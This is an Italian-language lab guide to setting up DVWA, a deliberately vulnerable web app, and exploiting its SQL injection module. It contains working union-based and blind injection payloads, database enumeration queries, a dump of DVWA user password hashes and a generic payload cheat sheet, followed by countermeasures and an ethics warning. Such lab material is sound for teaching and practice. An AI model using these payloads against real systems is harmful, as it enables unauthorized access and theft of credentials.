# DVWA - SQL Injection Exploitation Guide

## Introduzione

Questa guida documenta l'installazione e l'exploitation di **DVWA (Damn Vulnerable Web Application)** con focus specifico sulle tecniche di **SQL Injection**. DVWA √® un framework di testing progettato per praticare tecniche di penetration testing in un ambiente controllato e sicuro.

## Setup Ambiente DVWA

### Installazione Componenti Base

#### Installazione Stack LAMP

```bash
sudo apt update && sudo apt install -y apache2 mariadb-server php php-mysqli git unzip
```

**Componenti installati**:
- **Apache2**: Web server
- **MariaDB**: Database server (MySQL-compatible)
- **PHP**: Linguaggio server-side
- **php-mysqli**: Estensione PHP per MySQL
- **Git**: Version control per download DVWA

### Configurazione DVWA

#### Download e Setup File

```bash
cd /var/www/html
sudo git clone https://github.com/digininja/DVWA.git
sudo chown -R www-data:www-data DVWA
sudo chmod -R 755 DVWA
```

#### Configurazione Apache

```bash
sudo systemctl enable apache2 && sudo systemctl start apache2
```

#### Test PHP

```bash
echo "<?php phpinfo(); ?>" | sudo tee /var/www/html/info.php
```

**Verifica**: Navigare su `http://<IP_SERVER>/info.php` per confermare funzionamento PHP.

### Configurazione Database

#### Creazione Utente Database

```sql
CREATE USER 'dvwa_user'@'localhost' IDENTIFIED BY 'dvwa_pass';
GRANT ALL PRIVILEGES ON dvwa.* TO 'dvwa_user'@'localhost';
FLUSH PRIVILEGES;
EXIT;
```

#### Test Connessione

```bash
mysql -u dvwa_user -p
```

**Password**: `dvwa_pass`

#### Configurazione DVWA

Modificare il file di configurazione DVWA:

```php
$_DVWA[ 'db_user' ] = 'dvwa_user';
$_DVWA[ 'db_password' ] = 'dvwa_pass';
$_DVWA[ 'default_security_level' ] = 'low';
```

#### Riavvio Servizi

```bash
sudo systemctl restart apache2
```

### Inizializzazione DVWA

1. Navigare su `http://<IP_SERVER>/DVWA/setup.php`
2. Configurare il database
3. Impostare livello sicurezza su **"Low"**
4. **Credenziali default**: Username `admin`, Password `password`

## SQL Injection Fundamentals

### Cos'√® la SQL Injection

La **SQL Injection** sfrutta vulnerabilit√† nelle query SQL quando l'applicazione non filtra correttamente l'input utente. Inserendo codice SQL malevolo nei campi di input, un attaccante pu√≤:

- **Manipolare query** per accesso non autorizzato
- **Accedere, modificare o cancellare** dati
- **Rivelare struttura** del database
- **Eseguire comandi** sul server (in casi estremi)

### Query SQL Normale

```sql
SELECT * FROM users WHERE username = 'admin' AND password = 'admin123';
```

**Comportamento**: Verifica credenziali e permette accesso solo se valide.

### SQL Injection Base

#### Bypass Autenticazione

**Input malicious**:
- Username: `admin' --`
- Password: (vuoto)

**Query risultante**:
```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = '';
```

**Spiegazione**: Il `--` √® un commento SQL - tutto dopo viene ignorato.

**Query effettiva**:
```sql
SELECT * FROM users WHERE username = 'admin';
```

**Risultato**: Accesso senza conoscere la password.

## Exploitation Pratico su DVWA

### Test Vulnerabilit√†

#### Payload di Test

```sql
1'
```

#### Errore Risultante

```
Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax;
check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1''' at line 1
in /var/www/html/DVWA/vulnerabilities/sqli/source/low.php:11
```

> ‚ö†Ô∏è **Indicatore di Vulnerabilit√†**: Se un input causa errori SQL, il campo √® vulnerabile a SQL Injection.

### Union-Based SQL Injection

#### Determinazione Numero Colonne

**Metodo ORDER BY**:

```sql
1' ORDER BY 1 -- -
1' ORDER BY 2 -- -
1' ORDER BY 3 -- -
```

**Risultato**:
- `ORDER BY 2`: Successo
- `ORDER BY 3`: Errore

**Conclusione**: La tabella ha **2 colonne**.

#### Test UNION con Placeholder

```sql
-1' UNION SELECT null,null -- -
```

#### Injection con Dati Personalizzati

```sql
-1' UNION SELECT 1, 'pwned' -- -
```

**Output**:
```
ID: -1' UNION SELECT 1, 'pwned' -- -
First name: 1
Surname: pwned
```

**Spiegazione**:
- `-1`: Forza query originale a non restituire risultati
- `UNION SELECT`: Unisce risultati con query personalizzata
- `1, 'pwned'`: Valori iniettati nelle due colonne
- `-- -`: Commenta resto della query

### Database Enumeration

#### Identificazione Database

```sql
-1' UNION SELECT null, database() -- -
```

**Output**:
```
ID: -1' UNION SELECT null, database() -- -
First name: 
Surname: dvwa
```

**Risultato**: Nome database √® `dvwa`.

#### Enumerazione Tabelle

```sql
-1' UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema='dvwa' LIMIT 0,1 -- -
```

**Prima tabella**:
```
Surname: users
```

```sql
-1' UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema='dvwa' LIMIT 1,1 -- -
```

**Seconda tabella**:
```
Surname: guestbook
```

**Spiegazione componenti**:
- `information_schema.tables`: Tabella di sistema con metadati
- `WHERE table_schema='dvwa'`: Filtra per database specifico
- `LIMIT 0,1`: Prima tabella, `LIMIT 1,1`: Seconda tabella

#### Enumerazione Colonne

```sql
-1' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users' -- -
```

**Colonne identificate**:
```
user_id
first_name
last_name
user
password
avatar
last_login
failed_login
```

### Data Extraction

#### Dump Completo Utenti

```sql
-1' UNION SELECT user,password FROM users -- -
```

**Risultato completo**:
```
ID: -1' UNION SELECT user,password FROM users -- -
First name: admin
Surname: 5f4dcc3b5aa765d61d8327deb882cf99

First name: gordonb
Surname: e99a18c428cb38d5f260853678922e03

First name: 1337
Surname: 8d3533d75ae2c3966d7e0d4fcc69216b

First name: pablo
Surname: 0d107d09f5bbe40cade3de5c71e9e9b7

First name: smithy
Surname: 5f4dcc3b5aa765d61d8327deb882cf99
```

### Analisi Hash Password

#### Caratteristiche Hash

- **Lunghezza**: 32 caratteri
- **Formato**: Esadecimale
- **Algoritmo**: MD5 (molto probabile)

#### Hash Comuni Identificati

```
5f4dcc3b5aa765d61d8327deb882cf99 ‚Üí "password"
```

**Utenti con stessa password**: `admin` e `smithy`

> üìù **Nota Sicurezza**: Gli hash MD5 sono facilmente crackabili con dizionari/rainbow tables.

## Tecniche Avanzate SQL Injection

### Blind SQL Injection

#### Boolean-Based

```sql
1' AND 1=1 --       # Vero ‚Üí Risposta normale  
1' AND 1=2 --       # Falso ‚Üí Nessun risultato
```

#### Time-Based

```sql
1' AND SLEEP(5) -- -
```

**Test**: Se la risposta ritarda 5 secondi, la query viene eseguita.

> ‚ö†Ô∏è **Nota**: DVWA usa MariaDB/MySQL, quindi utilizza `SLEEP()` (non `pg_sleep` di PostgreSQL).

### Information Schema Exploitation

#### Struttura Information Schema

**Tabelle chiave**:
- `information_schema.tables`: Metadati tabelle
- `information_schema.columns`: Metadati colonne
- `information_schema.schemata`: Elenco database

#### Query Template Database

```sql
-1' UNION SELECT 1, schema_name FROM information_schema.schemata -- -
```

#### Query Template Privilegi

```sql
-1' UNION SELECT 1, grantee FROM information_schema.user_privileges -- -
```

## Payload Cheat Sheet

### Detection Payloads

```sql
'
"
`
')
")
`)
' OR '1'='1
" OR "1"="1
` OR `1`=`1
```

### Union Detection

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
...
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

### Information Gathering

```sql
# Database version
-1' UNION SELECT NULL, @@version -- -

# Current user
-1' UNION SELECT NULL, user() -- -

# Database name
-1' UNION SELECT NULL, database() -- -

# List databases
-1' UNION SELECT NULL, schema_name FROM information_schema.schemata -- -

# List tables
-1' UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema='TARGET_DB' -- -

# List columns
-1' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='TARGET_TABLE' -- -
```

### Data Extraction

```sql
# Extract data
-1' UNION SELECT username, password FROM users -- -

# Concatenate multiple columns
-1' UNION SELECT NULL, CONCAT(username,':',password) FROM users -- -

# Extract with conditions
-1' UNION SELECT NULL, password FROM users WHERE username='admin' -- -
```

## Countermeasures e Prevenzione

### Prepared Statements

#### PHP PDO Esempio

```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);
```

### Input Validation

#### Sanitizzazione Input

```php
$username = mysqli_real_escape_string($connection, $_POST['username']);
$password = mysqli_real_escape_string($connection, $_POST['password']);
```

### Principi di Sicurezza

1. **Never Trust Input**: Validare sempre input utente
2. **Least Privilege**: Database user con privilegi minimi
3. **Error Handling**: Non esporre errori SQL all'utente
4. **WAF (Web Application Firewall)**: Filtraggio automatico
5. **Regular Updates**: Aggiornamenti database e applicazioni

## Best Practices Testing

### Ambiente Sicuro

- **Isolamento**: Testing solo in ambiente controllato
- **Permessi**: Mai testare su sistemi senza autorizzazione
- **Documentazione**: Registrare tutte le tecniche utilizzate

### Metodologia

1. **Reconnaissance**: Identificazione tecnologie
2. **Discovery**: Ricerca punti di injection
3. **Exploitation**: Sfruttamento vulnerabilit√†
4. **Enumeration**: Mappatura database
5. **Extraction**: Recupero dati sensibili
6. **Documentation**: Report dettagliato

## Conclusioni

### Lezioni Apprese

- **SQL Injection** rimane una delle vulnerabilit√† pi√π critiche
- **Input validation** √® fondamentale per la sicurezza
- **Error messages** possono rivelare informazioni critiche
- **Database enumeration** permette mapping completo
- **Hash MD5** sono facilmente crackabili

### Strumenti Complementari

- **SQLMap**: Automation SQL injection
- **Burp Suite**: Web application testing
- **OWASP ZAP**: Security testing automatizzato
- **Hashcat**: Hash cracking
- **John the Ripper**: Password cracking

### Ethical Considerations

> ‚ö†Ô∏è **IMPORTANTE**: Utilizzare queste tecniche solo in ambienti autorizzati e controllati. L'uso non autorizzato costituisce reato.

---
